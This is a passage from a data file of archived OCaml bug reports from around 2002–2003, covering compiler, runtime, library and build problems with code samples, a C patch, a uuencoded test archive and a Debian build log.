tk.h)\nthe solution is to put this line before the inclusion of tk.h :\n\n#define USE_COMPOSITELESS_PHOTO_PUT_BLOCK 1\n\nit works!!!\n\nhappy if it helps\n\nsincerely yours,\n\nEmmanuel CHAUVEAU\n\n\n-------------------------------------------------------------\nEmmanuel CHAUVEAU\nCompuer Science Ph.D. Student\nFrance TÃ©lÃ©com R&D\nDTL/TAL\n------------------------------------------------------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1539\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Ohad Rodeh\nVersion: 3.06\nOS: WinXP/Linux\nSubmission from: nesher3.haifa.il.ibm.com (192.115.216.85)\n\n\nThe problem occurs when compiling an implementation file  (x.ml) which has an\ninterface file (x.mli). The following set of steps that should work, do not. \n1. Compile x.mli and place x.cmi in /tmp\n    ocamlc -c -o /tmp/x.cmi x.mli\n2. Try to compile x.ml: \n    ocamlc -c -I /tmp -o /tmp/x.cmo x.mli\nThe compiler complains that it cannot find x.cmi although /tmp is part of the\ninclude path x.cmi is in fact in /tmp/x.cmi\n"},{"labels":["bug"],"text":"**Original bug ID:** 1537\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIf you compile a *.cma or *.cmxa with a trailing -l at the end of the command \nline, ocamlc and ocamlopt compile everything without complaining.\nOnly when you try to use such a library, compilation fails with the rather \ncryptic error message\n\n/usr/bin/ld: cannot find -l--library=unix\n\nYours, Florian Hars.\n-- \nDr. Florian Hars                   |\nBIK ASCHPURWIS + BEHRENS GmbH      |  BÃ¼ro, papierloses (n):\nFeldbrunnenstr. 7, 20148 Hamburg   |    BÃ¼ro, in dem groÃe Haufen Papier\n(040) 41 47 87 -21, Fax: -15       |    lose herumliegen       (FdI#321)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1536\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Dr Andrew A. Adams\nVersion: Caml Light 0.75/0.75\nOS: RedHat Linux 7.3\nSubmission from: viwc1.rdg.ac.uk (134.225.16.91)\n\n\nI have an application I'm developing to teach first year students. It involves\nimplementing types for Binary, Octal and Hexadecimal numbers and defining\nconversions between them, integers and string representations of the Binary,\nOctal and Hex numbers. When I cam to write the final part of this I wanted to\ntranslate a list of string representations between two number systems leading to\nthe expression:\n\n(map string_of_Octal (map Octal_of_Binary (map Binary_of_string strs)))\n\n\nwhich leads to an error:\n\nFile \"translation.ml\", line 16, characters 8-33:\n>\t\t\t\t\t  (map Binary_of_string strs))));\n>\t\t\t\t\t   ^^^^^^^^^^^^^^^^^^^^^^^^^\nThis expression has type Binary list,\nbut is used with type Binary list.\n\n\nA gzipped tar file with all the code is available at:\n\nhttp://www.personal.rdg.ac.uk/~sis00aaa/BODH.tgz\n\ninclude \"translation\";;\n\nwill show the error.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1535\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIt appears that only the first of a set of simultaneously-defined recursive\ndefinitions is \"#trace\"able.  This is counter-intuitive.\n\nChris Dutchyn\ncdutchyn@cs.ubc.ca\n\n(* Test Cases *)\n(* (1) demonstrates the problem *)\n# let rec even x = if 0=x then true else odd (x-1)\n  and odd x = if 0=x then false else even (x-1);;\n\nval even : int -> bool = <fun>\nval odd : int -> bool = <fun>\n\n# #trace even;;\neven is now traced.\n\n# #trace odd;;\nodd is not a function.\n\n# even;;\n-: int -> bool = <fun>\n\n# odd;;\n- : int -> bool = <fun>\n\n\n(* (2) it is the rec that causes the failure *)\n# let rec foo x = x+1\n  and bar x = x+1;;\n\nval foo : int -> int = <fun>\nval bar : int -> int = <fun>\n\n# #trace bar;;\nbar is not a function.\n\n(* (3) without rec works *)\n# let foo1 x = x+2\n  and bar1 x = x-2;;\n\n# #trace bar1;;\nbar1 is now traced.\n\n(* end test cases *)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1534\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Hideo Bannai\nVersion: 3.06\nOS: Compaq Tru64 UNIX V5.1\nSubmission from: lavender.ims.u-tokyo.ac.jp (133.103.74.218)\n\n\nHello,\n\nThis might be related to #1350, but in my case it wasn't\na Linux system but a Tru64 UNIX system. The difference is that the compilation\nof OCaml went fine, but when I tried to run programs which allocate a large\namount\nof memory, (few hundred megabytes) I got the same 'out of memory' error.\n\ne.g:\n\n>         Objective Caml version 3.06\n> \n> #  Buffer.create 200000000;; (* about 200 MB? *)\n> Out of memory during evaluation.\n\nI recompiled OCaml with\n\n     #define USE_MMAP_INSTEAD_OF_MALLOC\n\nin config/s.h, and the problem seems to have gone away...\n\nRegards,\nHideo Bannai\n"},{"labels":["bug"],"text":"**Original bug ID:** 1533\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n{{in french}}\n\nChers developpeurs d'Ocaml (tout particulierement Xavier Leroy qui\ndoit connaitre mieux que moi toutes les subtilitÃ©s ici)\n\n\nLes primitives d'ouverture de fichiers devraient Ãªtre non bloquantes\nen mode multithread.\n\nEn effet, open peut Ãªtre bloquant quand on ouvre un FIFO.\n\nD'apres la man page de fifo(4) sous Linux\n\n       The kernel maintains exactly one pipe object for each FIFO\n       special file that is opened by at least one process.  The FIFO\n       must be opened on both ends (reading and writing) before data\n       can be passed.  Normally, opening the FIFO blocks until the\n       other end is opened also.\n\n       A process can open a FIFO in non-blocking mode. In this case,\n       opening for read only will succeed even if noone has opened on\n       the write side yet; opening for write only will fail with ENXIO\n       (no such device or address) unless the other end has already\n       been opened.\n\n       Under Linux, opening a FIFO for read and write will succeed\n       both in blocking and non-blocking mode. POSIX leaves this\n       behaviour undefined. This can be used to open a FIFO for\n       writing while there are no readers available.  A process that\n       uses both ends of the connection in order to communicate with\n       itself should be very careful to avoid deadlocks.\n\nIl me semble (et mon experience dans POESIA tend Ã  le montrer) que\nl'ouverture d'un FIFO en Ã©criture bloque tout le *processus*, et pas\nseulement le thread Ocaml qui fait open. C'est Ã  mon avis un bogue\n(que je trouve gÃ©nant, mais je reconnais que c'est tordu) du runtime\nOCaml.\n\nJe n'ai pas le temps (au moins pas avant vendredi) d'exhiber un\nexemple simple illustrant ce bogue.  (J'ai une revue de projet\neuropÃ©en sur POESIA et ne pourrais pas lire mon mail avant jeudi)\n\nAmicalement.\n\n-- \n\nBasile STARYNKEVITCH         http://starynkevitch.net/Basile/ \nemail: basile<at>starynkevitch<dot>net \nalias: basile<at>tunes<dot>org \n8, rue de la FaÃ¯encerie, 92340 Bourg La Reine, France\n"},{"labels":["bug"],"text":"**Original bug ID:** 1532\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n[[email in French]]\n\nChers developpeurs d'Ocaml\n\nArg.parse_argv dÃ©pend aussi de la valeur de Arg.current qui a Ã©tÃ©\nsouvent modifiÃ©e par Arg.parse \n\nJe suggÃ¨re soit de documenter qu'il faut gÃ©nÃ©ralement modifier la\nvaleur de Arg.current avant Arg.parse_argv (car elle a dÃ©jÃ  Ã©tÃ©\nmodifiÃ© par un Arg.parse prÃ©cÃ©dent) soit de l'ajouter Ã  Arg.parse_argv\npar \n\n(* code non testÃ© *)\nlet parse_argv ?(pcurrent=current) argv speclist anonfun errmsg =\n  let initpos = !pcurrent in\n  let stop error =\n    let progname =\n      if initpos < Array.length argv then argv.(initpos) else \"(?)\" in\n    begin match error with\n      | Unknown \"-help\" -> ()\n      | Unknown \"--help\" -> ()\n      | Unknown s ->\n          eprintf \"%s: unknown option `%s'.\\n\" progname s\n      | Missing s ->\n          eprintf \"%s: option `%s' needs an argument.\\n\" progname s\n      | Wrong (opt, arg, expected) ->\n          eprintf \"%s: wrong argument `%s'; option `%s' expects %s.\\n\"\n                  progname arg opt expected\n      | Message s ->\n          eprintf \"%s: %s.\\n\" progname s\n    end;\n    usage speclist errmsg;\n    if error = Unknown \"-help\" || error = Unknown \"--help\"\n    then exit 0\n    else exit 2\n  in\n  let l = Array.length argv in\n  incr current;\n  while !pcurrent < l do\n    let s = argv.(!pcurrent) in\n    if String.length s >= 1 && String.get s 0 = '-' then begin\n      let action =\n        try assoc3 s speclist\n        with Not_found -> stop (Unknown s)\n      in\n      begin try\n        match action with\n        | Unit f -> f ();\n        | Set r -> r := true;\n        | Clear r -> r := false;\n        | String f when !pcurrent + 1 < l ->\n            f argv.(!pcurrent + 1);\n            incr current;\n        | Symbol (symb, f) when !pcurrent + 1 < l ->\n            let arg = argv.(!pcurrent + 1) in\n            if List.mem arg symb then begin\n              f argv.(!pcurrent + 1);\n              incr current;\n            end else begin\n              stop (Wrong (s, arg, \"one of: \" ^ (make_symlist \"\" \" \" \"\" symb)))\n            end\n        | Set_string r when !pcurrent + 1 < l ->\n            r := argv.(!pcurrent + 1);\n            incr current;\n        | Int f when !pcurrent + 1 < l ->\n            let arg = argv.(!pcurrent + 1) in\n            begin try f (int_of_string arg)\n            with Failure \"int_of_string\" -> stop (Wrong (s, arg, \"an integer\"))\n            end;\n            incr current;\n        | Set_int r when !pcurrent + 1 < l ->\n            let arg = argv.(!pcurrent + 1) in\n            begin try r := (int_of_string arg)\n            with Failure \"int_of_string\" -> stop (Wrong (s, arg, \"an integer\"))\n            end;\n            incr current;\n        | Float f when !pcurrent + 1 < l ->\n            let arg = argv.(!pcurrent + 1) in\n            begin try f (float_of_string arg);\n            with Failure \"float_of_string\" -> stop (Wrong (s, arg, \"a float\"))\n            end;\n            incr current;\n        | Set_float r when !pcurrent + 1 < l ->\n            let arg = argv.(!pcurrent + 1) in\n            begin try r := (float_of_string arg);\n            with Failure \"float_of_string\" -> stop (Wrong (s, arg, \"a float\"))\n            end;\n            incr current;\n        | Rest f ->\n            while !pcurrent < l - 1 do\n              f argv.(!pcurrent + 1);\n              incr current;\n            done;\n        | _ -> stop (Missing s)\n      with Bad m -> stop (Message m);\n      end;\n      incr current;\n    end else begin\n      (try anonfun s with Bad m -> stop (Message m));\n      incr current;\n    end;\n  done;\n;;\n\n\nAmicalement\n\n-- \n\nBasile STARYNKEVITCH         http://starynkevitch.net/Basile/ \nemail: basile<at>starynkevitch<dot>net \nalias: basile<at>tunes<dot>org \n8, rue de la FaÃ¯encerie, 92340 Bourg La Reine, France\n"},{"labels":["bug"],"text":"**Original bug ID:** 1531\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nune petit remarque:\n\nLe programme qui teste l'IO asynchrone (async_io.c dans\nconfig/auto-aux) Ã©choue sur les systÃ¨mes linux pour un truc bÃªte : le\ntest est effectuÃ© sur des pipes alors que linux n'implÃ©mente l'IO\nasync que sur les sockets et les ttys. Or la communication X11 passe\npar des sockets, donc tout marche parfaitement pour le module Graphics\navec IO asynchrone (je crois que ce n'est utilisÃ© que lÃ ).\n\nJe suggÃ¨re donc de modifier le fichier async_io.c en remplaÃ§ant le\npipe() par un socketpair().\n\n-- \n   Olivier\n\n\n----------------\n--- config/auto-aux/async_io.c.bak\tFri Jan 31 16:53:56 2003\n+++ config/auto-aux/async_io.c\tFri Jan 31 17:04:48 2003\n@@ -13,10 +13,14 @@\n \n /* $Id: async_io.c,v 1.7 2001/12/07 13:39:43 xleroy Exp $ */\n \n+#include <stdlib.h>\n #include <stdio.h>\n #include <fcntl.h>\n #include <signal.h>\n #include <errno.h>\n+#include <unistd.h>\n+#include <sys/wait.h>\n+#include <sys/socket.h>\n #include \"s.h\"\n \n int signalled;\n@@ -33,7 +37,7 @@\n   int ret;\n #define OUT 0\n #define IN 1\n-  if (pipe(p) == -1) return 1;\n+  socketpair(PF_LOCAL, SOCK_DGRAM, 0, p);\n   signalled = 0;\n   signal(SIGIO, sigio_handler);\n   ret = fcntl(p[OUT], F_GETFL, 0);\n@@ -44,7 +48,7 @@\n     return 1;\n   case 0:\n     close(p[OUT]);\n-    write(p[IN], \"x\", 1);\n+    send(p[IN], \"x\", 1, 0);\n     sleep(1);\n     exit(0);\n   default:\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1528\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jacek Chrzaszcz\nVersion: 3.06\nOS: Linux\nSubmission from: fw-gw-atm.mimuw.edu.pl (193.0.96.15)\n\n\nBonjour,\n\nDeux lignes qui cassent ocaml toplevel:\n\n\nlet f1 = function `A -> \"a\" | `B -> \"b\";;\nlet f2 = function `C -> \"c\" | `D -> \"d\" | `A | _ as x -> f1 x;;\n\nWarning: this match case is unused.\nWarning: this pattern is unused.\nFatal error: exception Matching.Unused\n\n\nCa peut etre similaire au pb #539, mais je ne suis pas sur.\n\nAmities\n\nJacek\n"},{"labels":["bug"],"text":"**Original bug ID:** 1527\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Issac Trotts\nVersion: 3.06\nOS: linux (Debian)\nSubmission from: 128.120.141.217 (128.120.141.217)\n\n\nHere's a strange thing I ran into when trying to combine the\ntoplevel with another loop:\n\n$ cat test10.ml\n\nlet x = ref 1;;\n\nlet a () = while true do () done ;;\n\nlet b () = Topmain.main();;\n\nlet _ =\n  let ta = Thread.create a () in\n  let tb = Thread.create b () in\n  Thread.join ta;\n  Thread.join tb;\n;;\n\n$ ocamlc -thread -custom unix.cma threads.cma toplevellib.cma test10.ml \\\n           -cclib -lthreads -cclib -lunix -cclib -lpthread -o test10\n$ ./test10\n        Objective Caml version 3.06\n\n# Test10.x := 0;;\nSegmentation fault\n"},{"labels":["bug"],"text":"**Original bug ID:** 1526\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Marco Maggesi\nVersion: 3.06\nOS: debian linux on alpha\nSubmission from: sisiphos.math.unifi.it (150.217.33.46)\n\n\nI start the compilation of ocaml as follows\n\n  ~$ ./configure\n  ~$ make -k world > log.world 2>&1\n\nand the compilation abort here:\n  ...\n  sh ./runocamldoc true -man -d stdlib_man -I ../parsing -I ../utils -I\n../typing \n  -I ../driver -I ../bytecomp -I ../tools -I ../toplevel/ -I ../stdlib -I\n../other\n  libs/str -I ../otherlibs/dynlink -I ../otherlibs/unix -I ../otherlibs/num -I\n../\n  otherlibs/graph \\\n  -t \"OCaml library\" -man-mini \\\n  ../stdlib/*.mli ../otherlibs/unix/unix.mli ../otherlibs/str/str.mli\n../otherlibs\n  /bigarray/bigarray.mli ../otherlibs/num/num.mli\n  Fatal error: out of memory.\n  make[1]: *** [stdlib_man/Pervasives.o] Error 2\n  make[1]: Target `all' not remade because of errors.\n  make[1]: Leaving directory `/home/maggesi/ocaml-3.06/ocamldoc'\n\nThe previous versions of ocaml (e.g. 3.04) compiled without problems\non the very same box (a Compaq DS 10).\n\nI went futher and I installed anyway the ocaml bytecode compiler.\nBut then I tryied to compile Coq and the compilation ended with another\nend of memory.\n\nThe system itself seems have no problem of memory:\n\n  ~$ uname -a\n  Linux sisiphos 2.4.18marco #1 Fri Aug 23 12:37:19 CEST 2002 alpha unknown\n  ~$ set -a\n  ~$ free\n               total       used       free     shared    buffers     cached\n  Mem:        381584     369200      12384          0      10096     267016\n  -/+ buffers/cache:      92088     289496\n  Swap:       384048          0     384048\n"},{"labels":["bug"],"text":"**Original bug ID:** 1523\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nhi,\n        the following programm shows that neither Unix.select nor\n        Unix.sleep works with the Graphics library.\n\n        - michaell becker        \n\n\nocamlc -v\nThe Objective Caml compiler, version 3.06\n\n\nuname -a\nLinux strolch 2.4.10-4GB #\n\n\n\n\nlet mysleep () = \n  ignore (Unix.select []  [] [] 10.0)\n\n(* Unix.sleep 60; *)\n\nlet _ =\n  begin \n    Printf.printf \"hallo\\n\"; \n    flush stdout;\n    Graphics.open_graph \" 10x10\"; \n    mysleep ();\n    Graphics.close_graph (); \n    Printf.printf \"bye\\n\"\n  end\n"},{"labels":["bug"],"text":"**Original bug ID:** 1522\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHere's a uuencoded compressed tar file illustrating a bug with libraries.\n\nThere is an executable D which uses libraries B and C.  B and C each\nuse A.  A winds up being initialized twice, which in the real\napplication leads to failure.  It is not clear to me how to avoid this\nproblem unless I give up on structuring my code as multiple\nlibraries.  \n\n-- \nTim Freeman       \ntim@fungible.com\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78 \n\nbegin 664 trouble.tgz\nM'XL(`(M$)SX``^V:;6_;-A\"`_5F_XN9M0!(D>K->@`S&YB0>8\"\"IAS@!]F%`\nM0%%TS%D24XFJLW[H;Q\\I6[*3YJ4%8B5M[P%L2A1YE'\"\\._(DF8LR2IC5V2*V\nM[=EAZ*O2=D+?WBQK.G88.$[@N:[M=6S'#NV@`_XV;ZJF+\"3)`3J2IT^V>^[Z\nM-XI<Z3_:X@SX&OVKG]*_X_0\\U'\\;K/4?F6FRG3&4/=N!UNLC^G?<7JU_V_,=\nMK?]`31>PMW,[=_G!]9\\P\">R6Y907#'9V#Z',N(2^`?\"GR%,B37:3\\TQ.H3O*\nM(#+KIOM`@!?P:VS^D_WQ>Q=VQL+D,0Q,LFN\\]B,A7T%M_S1A)#.+V3;&T/8?\nM^D_X_]\"I[=_QO*\"C'8(;HOVWP<\\_61'/K&(&!^S6R%,XF,*>M6?2E*]*L2J)\nM*F/8^Z1//QEHY=\\'C?V_M?6?C^N_-ECKG[[>^L_QF_6?W^MI_8>V@_Z_#>ZM\nM_QY;^1WCRN_[I+;_^*WY?\\S_M,):_[&SK0#PK/\\/O<;_ZXV_6O_K*8'^OP52\nM$9<)@P'T86\"L3H[4R9&*`\\9#P>'(W*CY[>%HH:82AHMO@[7]GY$YF_*$O?P8\nME?U[C]N_Z]?YOU[H]2K[]\\,`[;\\-V.V-R\"4<C]]-CD?CR\\G5^7A\\H>S?-(W3\nMT=&[P=EPTJ<B*R@790$)CZ\"4/+E:\\,Q0#29_J::3\\>7YL6K637AQHV((T*O5\nM41?.AY/+TXM^=UG5-8RCR]'IR=7P[^$$#ON@)1@&SVA2Q@Q^V;E[&[M6.K?4\nMX%-^;:9S=!?;8\"/^NUN-_T_8O^V&3?P/';O:_P4NVG\\;Z!!_I8SXQ-F,ZVAK\nM/PK-^[^2)_$KY?_]T&WR_[Z[S/_[F/]IA;OY?[-Y#V30&(@A*$D3\"@<4B`H.\nMS2F!`Z%J]#L!_2]T8].THHWV!R-=0R\"ZUV]5K?^LI00E*JH.H@U1]`%1]$M$\nMT>J`;HB*'Q\"U+*-52:':^\\*7-'0W;T)`O#F\\;FE%]:'.J.I#)5N_1%$]FWLR\nM5+1](RZVMO_SX>#D;+B=,9Z+_T'@W_O^Q_%#W/^WPH6`7&W=U<:?,I`S!NI8\nMS8=T'WCV0<P9U('!-$82%CQ)@'U@F2Q)DOP'>:DV^U:\\#XL9I[/EY2H/<&@8\nM`##*8+!?22TS_KYD:N,OILN$@&T^T\\\"I&WSVT4'3]?,T@^ID7*P?0E?)&9'5\nM\"$VF0U7RC$M.$OZ1Q2`7G+)5/Q']RZC4V0E0TR*+\"YB*7(E.A)B7-R\")DJHZ\nM0ZH>G1&UTQ$Q6XXP(VHH843UDU0=Y8QGU[H>%B*?UV/D_)IGJO/E^6G=JEA*\nM4N5,RIM#RUHL%N:TS*ZY&M\"D(K56=FK*ZX_F2[J.VO[)6\\O_]C#_VP9K_9/7\nM>_\\7N.O]G^<OW_]YZ/_;@\":D*$\"4RGOW:_?'LMBH<K]$U65L45U>UNBMX@,)\nMW\\><^/VT+]G%#T<0!$$0!$$0!$$0!$$0!$$0!$$0!$$0!$$0Y.7X'S[.&7<`\n#4```\n`\nend\n"},{"labels":["bug"],"text":"**Original bug ID:** 1521\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello, ...\n\nDebian recently changed its default compiler to 3.2, as most of the\nother distributions have already done (or will do). gcc (and g++) 3.2\nwill be the standard for some time now.\n\nAnyway, while building cameleon, Jerome marant noticed a problem on\nsparc, after some checking i can confirm that ocaml does not build on\nsparc with gcc 3.2 (it builds fine with gcc 2.95). Here is the error\nmessage, i attach also a full build log together with some other\ninformation.\n\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I\nparsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c\ntoplevel/expunge.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -o expunge utils/misc.cmo\nutils/tbl.cmo utils/config.cmo utils/clflags.cmo typing/ident.cmo\ntyping/path.cmo typing/types.cmo typing/btype.cmo typing/predef.cmo\nbytecomp/runtimedef.cmo bytecomp/bytesections.cmo bytecomp/dll.cmo\nbytecomp/symtable.cmo toplevel/expunge.cmo\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -linkall -o ocaml.tmp\ntoplevel/toplevellib.cma toplevel/topstart.cmo\nmake[1]: *** [ocaml] Bus error\nmake[1]: Leaving directory `/home/luther/ocaml-3.06'\nmake: *** [build-stamp] Error 2\n\nI hope you can help us out on this, and that you have access to the\nhardware, if there is some problem, tell me and i can see if i can\narrange something.\n\nRelated installed packages :\n\nii  gcc-3.2        3.2.1-0pre6    The GNU C compiler.\nii  libc6          2.3.1-9        GNU C Library: Shared libraries and Timezone\nii  binutils       2.13.90.0.14-1 The GNU assembler, linker and binary utiliti\n\nInstalled kernel :\n\nLinux version 2.4.18 (root@vore) (gcc version egcs-2.92.11 19980921 (gcc2 ss-980\n609 experimental)) #1 Tue Mar 5 00:19:51 EST 2002\n\nCPU in the box :\n\ncpu             : TI UltraSparc II  (BlackBird)\nfpu             : UltraSparc II integrated FPU\npromlib         : Version 3 Revision 27\nprom            : 3.27.0\ntype            : sun4u\nncpus probed    : 1\nncpus active    : 1\nCpu0Bogo        : 591.46\nCpu0ClkTck      : 0000000011a4695a\nMMU Type        : Spitfire\n\nFriendly,\n\nSven Luther\n\n\n----------------\ndpkg-buildpackage: source package is ocaml\ndpkg-buildpackage: source version is 3.06-15\ndpkg-buildpackage: source maintainer is Sven Luther <luther@debian.org>\ndpkg-buildpackage: host architecture is sparc\n fakeroot debian/rules clean\ndh_testdir\ndh_testroot\nrm -f build-stamp configure-stamp opt-built-stamp\n# Add here commands to clean up after the build process.\n/usr/bin/make clean\nmake[1]: Entering directory `/home/luther/ocaml-3.06'\nrm -f ocamlc ocamlcomp.sh\nrm -f ocamlopt ocamlcompopt.sh\nrm -f ocaml toplevel/toplevellib.cma\nrm -f utils/config.ml\nrm -f parsing/parser.mli parsing/parser.ml parsing/parser.output\nrm -f parsing/lexer.ml\nrm -f parsing/linenum.ml\nrm -f ocamlc.opt\nrm -f ocamlopt.opt\nrm -f bytecomp/opcodes.ml\nrm -f bytecomp/runtimedef.ml\nrm -f asmcomp/arch.ml\nrm -f asmcomp/proc.ml\nrm -f asmcomp/selection.ml\nrm -f asmcomp/reload.ml\nrm -f asmcomp/scheduling.ml\nrm -f asmcomp/emit.ml\nrm -f expunge\ncd stdlib; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/stdlib'\nrm -f camlheader camlheader_ur\nrm -f *.cm* *.o *.a\nrm -f *~\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/stdlib'\ncd lex; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/lex'\nrm -f ocamllex ocamllex.opt\nrm -f *.cmo *.cmi *.cmx *.o\nrm -f parser.output\nrm -f parser.ml parser.mli\nrm -f lexer.ml\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/lex'\ncd tools; /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/tools'\nrm -f ocamldep\nrm -f ocamlprof ocamlcp\nrm -f ocamlmktop\nrm -f ocamlmklib\nrm -f ocamlmklib.ml\nrm -f ocaml299to3 lexer299.ml\nrm -f scrapelabels lexer301.ml\nrm -f addlabels\nrm -f cvt_emit\nrm -f cvt_emit.ml\nrm -f dumpobj\nrm -f opnames.ml\nrm -f dumpapprox\nrm -f objinfo\nrm -f primreq\nrm -f *.cmo *.cmi\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/tools'\ncd ocamldoc && /usr/bin/make clean\nmake[2]: Entering directory `/home/luther/ocaml-3.06/ocamldoc'\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/ocamldoc'\nfor i in unix str num dynlink bigarray systhreads graph dbm labltk; do \\\n          (cd otherlibs/$i; /usr/bin/make partialclean); \\\n        done\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/unix'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/unix'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/str'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/str'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/num'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/num'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/dynlink'\nrm -f extract_crc *.cm[ioa]\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/dynlink'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/bigarray'\nrm -f *.cm* \nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/bigarray'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/systhreads'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/systhreads'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/graph'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/graph'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/dbm'\nrm -f *.cm*\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/dbm'\nmake[2]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk'\nfor d in compiler support lib jpf frx tkanim examples_labltk camltk labltk examples_camltk browser; do \\\n    cd $d; /usr/bin/make -f Makefile clean; cd ..; \\\ndone\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/compiler'\nrm -f *.cm* parser.ml parser.mli lexer.ml copyright.ml\nrm -f pplex.ml ppyac.ml ppyac.mli ppyac.output\nrm -f tkcompiler pp parser.output\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/compiler'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/support'\nrm -f *.cm* *.o *.a *.so\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/support'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/lib'\nrm -f labltktop labltk *.cm* *.a\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/lib'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/jpf'\nrm -f *.cm* *.o *.a *~ *test\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/jpf'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/frx'\nrm -f *.cm* *.o *.a\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/frx'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/tkanim'\nrm -f *.cm* *.o *.a dlltkanim.so animwish gifanimtest\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/tkanim'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_labltk'\nrm -f hello demo eyes calc clock tetris lang *.opt *.o *.cm*\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/examples_labltk'\nmake[3]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\n/usr/bin/make -f Makefile.gen clean\nmake[4]: Entering directory `/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\nrm -f *.cm* *.ml *.mli *.o *.a\nmake[4]: Leaving directory `/home/luther/ocaml-3.06/otherlibs/labltk/camltk'\nrm -f .depend\nmake[3]: Leaving directory 